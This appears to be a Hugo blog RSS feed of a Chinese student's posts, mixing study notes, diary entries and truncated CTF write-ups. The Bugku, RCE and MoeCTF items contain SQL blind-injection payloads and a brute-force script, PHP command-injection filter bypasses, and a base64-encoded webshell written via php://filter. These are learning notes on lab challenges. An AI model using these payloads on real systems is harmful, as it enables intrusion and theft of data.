<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Console.makeHappy(_1ming)</title>
    <link>https://shenyimings.github.io/post/</link>
    <description>Recent content in Posts on Console.makeHappy(_1ming)</description>
    <image>
      <url>https://shenyimings.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://shenyimings.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 01 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://shenyimings.github.io/post/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>📌2021-2022-1 期末复习计划</title>
      <link>https://shenyimings.github.io/post/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92/</link>
      <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92/</guid>
      <description>[TOC]
Readme 感觉用了大量的时间做计划……好吧，既然是持续近1月的“政策”，花一天时间来拟定也无妨，本文处于随时更新状态。
这学期最难学分最高的课程已经考完，剩余课程比较平均，权重大致相同，没有重点，全是重点。
优点是有一整周的无课复习时间，考试时间间距也比较大，并无特别困难的科目，复习资料均充足，总而言之希望能取得好成绩。
期末考试时间    序号 课程名称 考试时间 学分     1 数字逻辑电路与系统设计 2022-01-04 09:00~10:40 3   2 马克思主义基本原理 2022-01-05 08:00~09:00 3   3 离散数学 2022-01-05 15:20~17:00 3   4 国际交流英语III 2022-01-07 09:00~10:40 2   5 大学物理B(下) 2022-01-07 15:20~17:00 3   6 概率统计A1 2022-01-11 15:20~17:00 3    复习时间 17周12月20日-12月26日课程极少，几乎可忽略不计。18周12月27日-1月3日有8天无课，19周周二考试，20周周二考完最后一门，其中1月8日-1月10日3天无考试。
时间极充裕。
复习计划 各科复习内容 数字逻辑电路与系统设计  课后练习题 往年期末题 利用proteus进行组合逻辑/时序逻辑电路设计  马克思主义基本原理（机考）  背，就硬背 攒复习资料，各种机考试题 找方法 看题库，酌情背课后习题  离散数学  课后习题  国际交流英语  看大学生学术英语课本  大学物理  重新打印习题册 重点练习电磁学部分习题  概率统计  课后习题 期末考试题  一轮复习计划表（12月15-12月26） 目标：完成四科概览</description>
    </item>
    
    <item>
      <title>离散数学 Discrete Mathematics</title>
      <link>https://shenyimings.github.io/tags/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/tags/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/</guid>
      <description>数理逻辑部分笔记知识点整理</description>
    </item>
    
    <item>
      <title>空想社会主义和科学社会主义的区别</title>
      <link>https://shenyimings.github.io/post/%E7%A9%BA%E6%83%B3%E7%A4%BE%E4%BC%9A%E4%B8%BB%E4%B9%89%E5%92%8C%E7%A7%91%E5%AD%A6%E7%A4%BE%E4%BC%9A%E4%B8%BB%E4%B9%89%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Sat, 01 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/%E7%A9%BA%E6%83%B3%E7%A4%BE%E4%BC%9A%E4%B8%BB%E4%B9%89%E5%92%8C%E7%A7%91%E5%AD%A6%E7%A4%BE%E4%BC%9A%E4%B8%BB%E4%B9%89%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
      <description>第一，它们产生的历史条件不同。 空想社会主义是在资本主义制度的矛盾还没有得到充 分暴露，无产级阶反对资产阶级的阶级斗争还处在自发阶段时的产物，是不成熟的历史条件 下的不成熟的理论。科学社会主义是在资本主义制度的内在矛盾已经充分发展和尖锐化，无产阶级已经作为支独立的政治力量登上阶级斗争舞台的条件下产生的，是建立在对资本主 义制度的科学分析和对无产阶级斗争经验正确总结的基础上的科学理论。
第二，它们的理论基础不同。 空想社会主义的理论基础是唯心主义的历史观，因此，它 们既不能同资产阶级的理性主义划清界限，更不能对社会历史作出正确的说明。科学社会主 义的理论基础是唯物主义的历史观，这种历史观打破了在社会历史领域中长期处于统治地位 的历史唯心主义，对社会历史的发展作出了正确而深刻的说明，揭示了社会发展的客观规律。
第三，它们的科学价值不同。 空想社会主义学说虽然也包含有合理的、积极的因素，但 它从总体上说是不科学的。恩格斯说:“以往的社会主义固然批判过现存的资本主义生产方 式及其后果，但是不能说明这个生产方式，因而也就不能对付这个生产方式”(《马克思恩 格斯选集》第3卷，第66页)。他门既不能说明资本主义何以必然灭亡，也不能说明社会主 义何以必然胜利;既不能指出通向社会主义的正确道路，又不能找到实现社会主义的依靠力 量。科学社会主义依据社会发展的各观规律，揭示了资本主义灭亡和社会主义胜利的历史必 然性，指明了通向社会主义的道路和实现社会主义的依靠力量。科学社会主义自产生以来， 经过实践的检验和发展，已经形成为一门有着丰富内容和完整体系的科学学说。当然，科学 社会主义理论今后还会在实践中继续丰富发展。但是，绝不能因此去否定它已经取得的科 学成果。
**第四，它们的历史作用不同。 ** 空想社会主义学说是社会主义思潮发展过程中的一个历史 阶段，因此，它也起过一定的历史作用。它不仅启发了早期无产者的阶级意识，而且也为科 学社会主义的创立积累了思想素材。但是，由于它的非科学的、空想的性质，使它的历史作 用非常有限。空想社会主义除个别的情况外，几乎和实践完全不发生关系。它们往往热衷 于具体描绘未来社会的兰图，凭空构思社会主义的细枝未节，而根本不去触动现存的社会制 度，这就更加重了它们的空想的色彩。科学社会主义自产生以来，始终和工人运动的实践密 切结合。它既是无产阶级革命实践的产物，又是无产阶级革命实践的理论指导。在科学社会 主义理论指导下，无产阶级反对资产阶级的斗争早已成为不可阻挡的世界潮流，并终于在本 世纪初实现了社会主义从理想到现实、从理论到社会制度的飞跃，在世界上建立起了社会主 义国家。目前，科学社会主义理论，不仅是资本主义国家中无产阶级和共产党人进行斗争的 思想武器，而且也是社会主义国家进行社会主义建设的指导思想，正在发挥着巨大的推动历 史前进的作用。
总之，科学社会主义同空想社会主义虽然有着历史的联系，但又有着根本的区别。</description>
    </item>
    
    <item>
      <title>我的2021</title>
      <link>https://shenyimings.github.io/post/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
      <pubDate>Fri, 31 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
      <description>刚刚感慨万分的敲上了 2021-12-31，以后再少有打2021的机会了，这一年还有七分钟就结束了。
从若干年前我就开始伤春悲秋了，写年终总结却时断时续，当时觉得总结纯属抒发情感矫揉造作，现在回想再看真是意义非凡。
今年算较为成功的一年了，和2020年的颓废相比，春节后算是一帆风顺，军训开始迅速减了肥，从以为要成为我一辈子耻辱的“儋州 宝岛新村” 跑进了海口，熟练了蛙泳，爱上了游泳，趁着疫情几近销声匿迹，去了广州，青岛，重庆，厦门，文昌，珠海，深圳；见了哥们，泡了妹妹，看过火箭，找了对象，打过比赛，有了工位，领了工资，有了目标与方向，摄影水平突飞猛进，年末搞搞学习，累过，爱过，热烈过，坦然过，内卷过，躺平过，一无所成过，手无足措过，心满意足了。
2022年，加油！</description>
    </item>
    
    <item>
      <title>早起可能是有意义的</title>
      <link>https://shenyimings.github.io/post/%E6%97%A9%E8%B5%B7%E7%9A%84%E6%84%8F%E4%B9%89/</link>
      <pubDate>Mon, 27 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/%E6%97%A9%E8%B5%B7%E7%9A%84%E6%84%8F%E4%B9%89/</guid>
      <description>到期末复习周了，天天自由自在9:00以后起床，想睡多久睡多久，终于摆脱了沙雕的一天只有一节课，一节7:40起床的架构型排课了……
但随着每天晚起，发现中午到点睡不着，睡不好，虽然我告诉自己在床上闭眼呼吸就算睡着，可下午身体还是不听指挥，头昏脑涨，全然没有一觉睡醒后的改天换地之感……
看来啊，想要保持高效率的一天，早起一点还是有必要的，这个早起未必是起多早，总而言之不能是自然醒。</description>
    </item>
    
    <item>
      <title>超脱 Detachment</title>
      <link>https://shenyimings.github.io/post/%E8%B6%85%E8%84%B1-detachment/</link>
      <pubDate>Fri, 24 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/%E8%B6%85%E8%84%B1-detachment/</guid>
      <description> 要无心太容易了，在乎才需要勇气。
It&amp;rsquo;s so easy to be careless. It takes courage to take care.
 最近几天断断续续地，基本看完了电影超脱 Detachment
思想沉重，挑个时间写写感想吧
 有人觉得我们能改变一些事情，有时当我们醒来，才知道我们也力不能及。
 </description>
    </item>
    
    <item>
      <title>坏事成吨</title>
      <link>https://shenyimings.github.io/post/%E5%9D%8F%E4%BA%8B%E6%88%90%E5%90%A8/</link>
      <pubDate>Thu, 23 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/%E5%9D%8F%E4%BA%8B%E6%88%90%E5%90%A8/</guid>
      <description>早上早八时圆通给我发了取件码，下了课9:30我就先把车找了个充电桩充上电，去拿快递，到了跟我说没到点，十点才能拿。。那你取件码发的倒他妈很勤啊，十点能拿你九点发什么取件码。刚走没两步收到消息说之前干的采集考研考生信息的工资到账了，我一查，果然没有，又屁颠屁颠跑去行政楼要钱，走到一半，转头一想，运气这么差，不会丫的充电头也让人拔了吧……一低头，我去
去你妈的，真几把会拔，五个都是绿灯就我一个红灯你拔我的？敢情这是碰上红绿色盲了？
咱也不是啥有素质的人，转头就走回去给他拔了，呵呵，正好是第三节上课的点，白停一上午，叫你丫眼瞎。
好事是不是成双来我不清楚，坏事确实会抱团来搞你。</description>
    </item>
    
    <item>
      <title>有关细节✒️</title>
      <link>https://shenyimings.github.io/post/%E6%9C%89%E5%85%B3%E7%BB%86%E8%8A%82/</link>
      <pubDate>Mon, 20 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/%E6%9C%89%E5%85%B3%E7%BB%86%E8%8A%82/</guid>
      <description>昨天晚上罕见的早睡，在床上困意十足地同生物钟作斗争时，不幸的想起了纠结的一些事情：要不要给台式机换个机箱？继续换itx A4机箱，还是换一个开放式机箱？再换itx有必要吗？换开放式机箱能装好/带走吗？……诸如此类。
我现在的台式机有点问题，若受到颠簸后会电平不稳，开机不亮屏，反复自启至无法开机，放置至少一天半天后才可恢复，这种问题如此奇葩以至于网上甚至少有相关问题。或许是它不适应海南潮湿的天气，或许是全铝合金的机箱接地漏电，当然，更或许是我当初装机时少拧了一个位置妖娆的电源螺丝……即使后来痛苦地补上了，但是损害已经造成，长期的漏电导致我本就不靠谱的RX580 2048sp显卡和450w sfx电源产生了或多或少的损害，现在的电脑之于我已经是一尊大爷，每次只能请他帮我一点微不足道的小忙。
睡前也是一段贤者时间，我再一次开始反省自己的过往。2020年暑假，我帮一位同学组装他的新电脑时（我只是在旁边起一个Readme.md的作用）主板某处螺丝孔位不对，我和他起了一点争执，我以我多年装机经验认为把有洞的螺丝拧上起个固定作用即可，没有必要全部拧上，他则认为应当精益求精，注重细节，坚持把主板拆下来重新布局铜柱。当然，他是对的，我多年的、不注重细节的装机经验，只是现在在我入睡前折磨着我。
不仅仅如此。
20年也是我高考的日子，一直让我耿耿于怀的30分，让我从末流985到末流211的30分。我现在可以以过来人的身份说高考不那么重要，未来还他妈有很多很多的机会……是啊，可是这个机会失去了，那个疫情在家期间每天拼命学习，模拟考真的弯道超车的我的努力付诸东流了，这和我磕磕绊绊的电脑一样，也是因为没有细节。
一年过去了，当我的女朋友告诉我她是因为我对细节的注重才注意到我时，我却觉得是莫大的讽刺。那也许只是我对细枝末节强迫症般的追求和蹩脚的脑细胞进程调度产生的错觉，我并没有真正做到注重细节，骨子里还是一个粗心大意丢三落四的人。
这篇文章似乎并不该被我传到博客里，写完才发现这些其实应该是我日记里写的东西……
是啊，我还有个日记本，插在我的书架里。</description>
    </item>
    
    <item>
      <title>Public Key Cryptology</title>
      <link>https://shenyimings.github.io/post/public-key-cryptography/</link>
      <pubDate>Tue, 09 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/public-key-cryptography/</guid>
      <description>CONTEXT ​	The first general purpose computers were built in the 1940s. They were large, filling big rooms, using hundreds of valves and consuming many kilowatts of electricity. Although they were considered amazing for the ability to execute thousands of instructions per second at that time, all these huge machines were rapidly became history and might have been lost in the mists of time. With the increasing speed of computing, networks of computers were established allowing people to have access to communicate with others in distant places.</description>
    </item>
    
    <item>
      <title>Bugku-SQL注入-WriteUP</title>
      <link>https://shenyimings.github.io/post/15.bugku-sql%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Sun, 24 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/15.bugku-sql%E6%B3%A8%E5%85%A5/</guid>
      <description>题目网址：sql注入
一个很正经的界面，有实战那味了。
上来先尝试经典组合：
admin~password
很幸运，用户名猜中了。
利用单引号检测是否存在SQL注入
admin&#39; or 1 = 1
报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：
&#39;or&amp;lt;&amp;gt;(不等号)#()空格可用括号代替，等号可用相反的不等号
先尝试是否存在布尔注入：
成功，用户名存在注入~
之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）
select password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload
1&amp;#39;or((ascii(mid((select(password)from(admin))from(1))))&amp;lt;&amp;gt;9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难
我们尝试下集束炸弹，让两个参数都作为目标
第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码
爆破成功了。。。
接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：
4dcc88f8f1bc05e7c2ad1a60288481a2
去md5破解站破解一下，成功解出密码：
bugkuctf
结束了……
反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。
贴一组大神的python自动脚本，以供学习
#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = &amp;#39;http://114.67.246.176:19665/&amp;#39; sss = string.digits + (string.ascii_lowercase) a = &amp;#39;&amp;#39; for i in range(1, 50): flag = 0 for j in sss: payload = &amp;#34;admin&amp;#39;^((ascii(mid((select(password)from(admin))from(%s))))&amp;lt;&amp;gt;%s)^1#&amp;#34; % (i, ord(j)) #屏蔽了&amp;#34;,&amp;#34;，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #&amp;lt;&amp;gt;表示不等号 #^表示异或 payload2= &amp;#34;admin123&amp;#39;or((ascii(mid((select(password)from(admin))from(%s))))&amp;lt;&amp;gt;%s)#&amp;#34;%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= &amp;#34;admin123&amp;#39;or((ascii(mid((select(database()))from(%s))))&amp;lt;&amp;gt;%s)#&amp;#34;%(i,ord(j)) data = {&amp;#39;username&amp;#39;: payload, &amp;#39;password&amp;#39;: &amp;#39;admin&amp;#39;} res = requests.</description>
    </item>
    
    <item>
      <title>CNSS Recruit-Web Write UP</title>
      <link>https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/</guid>
      <description>前言 躺在床上，不想动鼠标，那就先写写前言吧。
这个CTF比赛是我打的第二场比较正规、完整的比赛。
惨不忍睹，当然，作为刚入门的noob来说也可以接受。
希望能通过笔记的整理消化新掌握的知识，道阻且长。
[👶Baby]GitHacker 根据题目名，应该是考察Git泄露相关知识。
关于工具Githack的使用和Python2/3的同时安装 使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为python2.exe，则在pws中输入python是运行python3，输入python2则是运行Python2.
python2 .\GitHack.py http:\\x.x.x\.git 运行后即得到git目录。
Git版本管理 这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。
git log # 查看提交记录（版本号） git status # 查看本地修改记录 git reset --hard 目标版本号 # 退回目标版本号 git reset HEAD # 回退到最早版本 git checkout # 还原与版本记录不符的所有文件 git restore 目标文件名 # 还原与版本记录不符的目标文件 这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜CNSS而不是flag。
其他Githack脚本 在CTF中推荐Git_Extract-master这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了git reset和git checkout的过程。
[😃Easy]更坑的数学题 仅有的提示就是快速把结果提交，有可能会出现flag。
第一反应是绕过和注入咯，尝试后无果。
再观察续一秒按钮前端代码，发现是安慰剂按钮。。。
那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：
import requests import re # 正则表达式库 import string from requests.sessions import session url = &amp;#39;http://81.68.109.40:30005/&amp;#39; session = requests.</description>
    </item>
    
    <item>
      <title>RCE 远程命令执行漏洞</title>
      <link>https://shenyimings.github.io/post/13.rce%E4%B8%93%E6%A0%8F/</link>
      <pubDate>Wed, 20 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/13.rce%E4%B8%93%E6%A0%8F/</guid>
      <description>本文以CTF-show Web入门29-41题作为例题，学习RCE相关知识。
Web 29 过滤了flag字样
?c=system(&amp;quot;cat f*&amp;quot;);Web 30 过滤了flag|system|php三个关键字，flag和php是待执行命令文本， 可以通过引号、斜杠或反斜杠绕过
echo `cat f\lag.ph\p`; 反引号可以执行系统命令
Web 31 在cat被禁时，我们还可以采用如下命令
 1.tac：从最后一行开始显示，是cat的反向显示 2.more：一页一页的显示档案内容 3.less：与more类似 4.head：查看文档的前几行 5.tail：查看文档的后几行 6.nl：显示的时候，顺便输入行号 7.od：以二进制的方式读取档案内容 8.vi：一种编辑器 9.uniq：查看 10.vim：一种编译器
 空格的代替符号：
 1.${IFS}2.$IFS$13.${IFS4.%205.&amp;lt;和&amp;lt;&amp;gt;重定向符6.%09 构造本题payload
?c=echo&amp;#39;more%09f*&amp;#39;;  其他题解：
?c=eval($_GET[1]);&amp;amp;1=system(&amp;#39;cat flag.php&amp;#39;);嵌套脱离了c的正则判断 ?c=echo`strings%09f*`; ?c=&amp;#34;\x73\x79\x73\x74\x65\x6d&amp;#34;(&amp;#34;nl%09fl[a]*&amp;#34;);等价于system()。这个学到了！  Web 32 屏蔽了echo
分号可以用?&amp;gt;代替，括号可以用“”绕过，利用文件包含的方式查看flag.php，注意要先进行base64转码以绕过关键词过滤。
?c=include&amp;#34;$_GET[1]&amp;#34;?&amp;gt;&amp;amp;1=php://filter/read=convert.base64- encode/resource=flag.php 绕过死亡EXIT - CNSS 太极掌门人 &amp;lt;?php $filename=$_GET[&amp;#39;filename&amp;#39;]; $content=$_GET[&amp;#39;content&amp;#39;]; file_put_contents($filename,&amp;#34;&amp;lt;?php exit();&amp;#34;.$content); 两个参数变量间用exit()方法隔开，即使注入一句话也无法执行，如何绕过这个“死亡exit”？
我们只需要将content前面部分内容使用某种手段(如编码)进行处理，导致PHP不能识别该部分即可。
base64绕过 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。
?filename=php://filter/convert.base64-decode/resource=1.php&amp;amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== [😮Mid]太极掌门人 &amp;lt;?php error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir !</description>
    </item>
    
    <item>
      <title>离散数学CH05-一阶逻辑等值演算与推理</title>
      <link>https://shenyimings.github.io/post/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E6%95%B0%E7%90%86%E9%80%BB%E8%BE%91/%E7%AC%AC5%E7%AB%A0/ch05/</link>
      <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E6%95%B0%E7%90%86%E9%80%BB%E8%BE%91/%E7%AC%AC5%E7%AB%A0/ch05/</guid>
      <description>一阶逻辑等值式与置换规则 定义5.1 $$ 设A,B是一阶逻辑中任意两个公式，若A\leftrightarrow B 是永真式，则称A与B等值 \\ 记作A\Leftrightarrow B $$
基本等值式 第1组 第二章P21页，16组重言式
双重否定律、幂等律、交换律、结合律等
第2组   量词否定等值式 $$ \neg \forall xA(x)\Leftrightarrow \exist x \neg A(x) $$
  量词辖域收缩与扩张等值式
设公式A(x)含自由出现的个体变项x，B不含x的自由出现，则 $$ \forall x (A(x)\vee B)\Leftrightarrow \forall xA(x)\vee B \\ \forall x (A(x)\rightarrow B)\Leftrightarrow \exist xA(x)\rightarrow B \\ \exist x(A(x)\rightarrow B)\Leftrightarrow \forall x A(x)\rightarrow B \\ $$
  量词分配等值式 $$ \forall x(A(x)\wedge B(x))\Leftrightarrow \forall xA(x)\wedge \forall xB(x) $$
  进行等值演算，除以上基本等值式外，还有以下2条规则</description>
    </item>
    
    <item>
      <title>离散数学CH04-一阶逻辑基本概念</title>
      <link>https://shenyimings.github.io/post/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E6%95%B0%E7%90%86%E9%80%BB%E8%BE%91/%E7%AC%AC4%E7%AB%A0/ch04/</link>
      <pubDate>Fri, 08 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E6%95%B0%E7%90%86%E9%80%BB%E8%BE%91/%E7%AC%AC4%E7%AB%A0/ch04/</guid>
      <description>一阶逻辑命题符号化 一阶逻辑公式及其解释 定义4.5 $$ 在公式\forall x A 和\exist x A 中，称x为指导变元，A为量词的辖域\\ 在\forall x \exist x的辖域中，x的所有出现都称作约束出现，A中不是\\ 约束出现的其他变项均被称作自由出现 $$
定义4.6 $$ 设A是任意的公式，若A中不含自由出现的个体变项，则称A为封闭的公式，简称闭式 $$</description>
    </item>
    
    <item>
      <title>离散数学CH03-命题逻辑的推理理论</title>
      <link>https://shenyimings.github.io/post/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E6%95%B0%E7%90%86%E9%80%BB%E8%BE%91/%E7%AC%AC3%E7%AB%A0/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-ch03/</link>
      <pubDate>Thu, 07 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E6%95%B0%E7%90%86%E9%80%BB%E8%BE%91/%E7%AC%AC3%E7%AB%A0/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-ch03/</guid>
      <description>前言  所谓推理是指从前提出发推出结论的思维过程，而前提是已知的命题公式集合，结论是从前提出发应用推理规则推出的命题公式。
 定理3.1  命题公式$A_1,A_2,\cdots,A_k$推出B的推理正确当且仅当 $$ A_1\wedge A_2,\wedge \cdots,\wedge A_k \to B $$ 为重言式。
 今后把推理的形式结构写成: $$ 前提：A_1,A_2,\cdots,A_k\\ 结论：B $$ 并根据判断定理3.1的蕴含式是否是重言式来确定推理是否正确。根据前2章的讨论，判断是否为重言式有下面3种方法：
 真值表法 等值演算法 主析取范式法  常用重言蕴含式（推理定律）  $$ (A\to B)\wedge A \Rightarrow B \qquad 假言推理\\ (A\to B)\wedge \neg B\Rightarrow \neg A\qquad 拒取式\\ (A\vee B)\wedge \neg B \Rightarrow A \qquad 析取三段论\\ (A\to B)\wedge (B\to C)\Rightarrow (A\to C) \qquad 假言三段论\\ $$
 推理证明格式 例3.3 在自然推理系统P中构造下面推理的证明。 前提：$$P\vee q,q\to r,p\to s,\neg s$$</description>
    </item>
    
    <item>
      <title>离散数学CH02-命题逻辑等值演算</title>
      <link>https://shenyimings.github.io/post/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E6%95%B0%E7%90%86%E9%80%BB%E8%BE%91/%E7%AC%AC2%E7%AB%A0/ch02/</link>
      <pubDate>Sun, 19 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E6%95%B0%E7%90%86%E9%80%BB%E8%BE%91/%E7%AC%AC2%E7%AB%A0/ch02/</guid>
      <description>析取范式与合取范式 定理2.3（范式存在定理） 任一命题公式都存在与之等值的析取范式和合取范式，求给定公式的步骤为：
  消去连接词
  用双重否定律消去双重否定符，用德摩根律内移否定符。
  使用分配律：求析取范式时使用 $$\land合取$$ 对 $$ \vee析取 $$ 的分配律，求合取范式相反。
合取对析取的分配律： $$ A\wedge(B\vee C)\Leftrightarrow (A\wedge B)\vee(A\wedge C) $$
  定义2.4  在含有n个命题变项的简单合取式（简单析取式）中，若每个命题变项和它的否定式只出现一次，将其按照下标从小到大排列，则这样的简单合取式称为最小项。
 例： $$ p\wedge q成真赋值为\quad1\quad 1\\ 则按照二位二进制，(11)_2=3，故此项为极小项m_3 $$
联结词的完备集 定义2.6 $$ 称F:{0,1}^n\rightarrow {0,1}为n元真值函数 $$
n个命题变项共可构成$2^{2^n}$个不同的真值函数。
   P $$F_0^{(1)}$$ $$F_1^{(1)}$$ $$F_2^{(1)}$$ $$F_3^{(1)}$$     0 0 0 1 1   1 0 1 0 1    按照n位二进制进行编号。</description>
    </item>
    
    <item>
      <title>离散数学CH01-命题逻辑的基本概念</title>
      <link>https://shenyimings.github.io/post/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E6%95%B0%E7%90%86%E9%80%BB%E8%BE%91/%E7%AC%AC1%E7%AB%A0/ch01/</link>
      <pubDate>Sat, 18 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E6%95%B0%E7%90%86%E9%80%BB%E8%BE%91/%E7%AC%AC1%E7%AB%A0/ch01/</guid>
      <description>命题与联结词 定义1.2  设p,q为两个命题，复合命题“p并且q”（或“p与q”）称为p与q的合取式，记作$p\wedge q$
规定$p\wedge q$为真当且仅当p与q同时为真。
 定义1.3  设p,q为两个命题，复合命题“p或q”，称为p与q的析取式，记作 $$ p\vee q $$
规定$$p\vee q$$为假当且仅当p与q同时为假。
 定义1.4  设p,q为两个命题，复合命题“如果p，则q”，称为p与q的蕴含式，记作$$ p\rightarrow q$$
并称p为蕴含式的前件，q为蕴含式的后件
规定p→q为假当且仅当p为真，q为假。==若前件为假，则蕴含式恒真==
 </description>
    </item>
    
    <item>
      <title>MoeCTF 2021 西电新生赛WP</title>
      <link>https://shenyimings.github.io/post/12.moectf-web-write-up/</link>
      <pubDate>Thu, 19 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/12.moectf-web-write-up/</guid>
      <description>前言-2021/8/10 今天学长在群里发了西电的新生CTF比赛，题目较为基础，适合我们初学者。
想来还是感慨颇多的，西电不愧是网安的头部院校，信安的新生还没入学就开始打CTF比赛了，我大二了才刚刚踏入大门而已。
1. Web安全入门指北-GET &amp;lt;?php include &amp;#34;flag.php&amp;#34;; $moe = $_GET[&amp;#39;moe&amp;#39;]; if ($moe == &amp;#34;flag&amp;#34;) { echo $flag; }else { highlight_file(__FILE__); } 签到题。已给出源代码，根据题目提示，可以看出是一个简单的get命令题。
在地址栏中发送get请求：
http://47.93.215.154:10000/?moe=flag
得到flag：
moectf{We1c0me_t0_CTF_Web!}
2. Web安全入门指北-POST &amp;lt;?php include &amp;#34;flag.php&amp;#34;; $moe = $_POST[&amp;#39;moe&amp;#39;]; if ($moe == &amp;#34;flag&amp;#34;) { echo $flag; }else { highlight_file(__FILE__); } 给出源代码，只需要发送post请求给moe变量赋值flag即可。
用hackbar：
在post参数里填入moe=flag
Execute执行即可得flag:moectf{POST_1s_an_1mp0rtant_m3th0d!}
3. Web安全入门指北-小饼干 这道题非常有意思，通过网页提示:
You are not VIP,I will give flag to VIP!
可以大致猜测要伪造某些访问项目，将非VIP改为VIP。
用Burp Suite抓包得到，有一个cookie项为VIP=0，可以通过篡改VIP值来达到伪造cookies的目的。
将抓包结果发送到重发器，将VIP值改为1，点击发送。
得到flag。
4. 2048 打开环境，发现是一个2048小游戏</description>
    </item>
    
    <item>
      <title>DVWA环境搭建 &#43; BurpSuite2.1安装 &#43; Chrome配置</title>
      <link>https://shenyimings.github.io/post/9.dvwa%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&#43;burpsuite2.1%E5%AE%89%E8%A3%85/</link>
      <pubDate>Thu, 05 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/9.dvwa%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&#43;burpsuite2.1%E5%AE%89%E8%A3%85/</guid>
      <description>[TOC]
DVWA环境搭建  DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。
